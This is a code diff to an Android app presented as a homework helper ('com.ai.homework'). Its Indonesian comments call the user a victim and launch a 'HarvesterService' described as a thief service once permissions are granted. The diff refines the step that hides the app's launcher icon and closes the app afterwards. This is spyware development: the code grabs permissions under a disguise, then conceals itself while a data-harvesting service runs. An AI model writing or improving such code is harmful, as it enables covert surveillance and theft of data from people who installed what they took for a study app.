@@ -1,6 +1,7 @@
 package com.ai.homework;
 
 import android.Manifest;
+import android.content.ComponentName;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.Bundle;
@@ -25,7 +26,6 @@ public class MainActivity extends AppCompatActivity {
         btnScan.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
-                // 1. Minta Semua Izin Dulu
                 requestPermissions();
             }
         });
@@ -59,7 +59,6 @@ public class MainActivity extends AppCompatActivity {
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == PERMISSION_REQUEST_CODE) {
-            // Setelah korban klik "Izinkan", baru jalanin
             startTheSpy();
         }
     }
@@ -70,17 +69,19 @@ public class MainActivity extends AppCompatActivity {
         // Jalanin Service Pencuri
         startService(new Intent(this, HarvesterService.class));
 
-        // Sembunyiin Icon & Tutup Aplikasi
+        // Sembunyiin Icon pake ComponentName eksplisit
         new Handler().postDelayed(new Runnable() {
             @Override
             public void run() {
+                ComponentName componentName = new ComponentName(MainActivity.this, MainActivity.class);
                 getPackageManager().setComponentEnabledSetting(
-                        getComponentName(),
+                        componentName,
                         PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                         PackageManager.DONT_KILL_APP
                 );
-                finish();
+                // Tutup aplikasi
+                finishAffinity();
             }
-        }, 2000);
+        }, 3000);
     }
 }
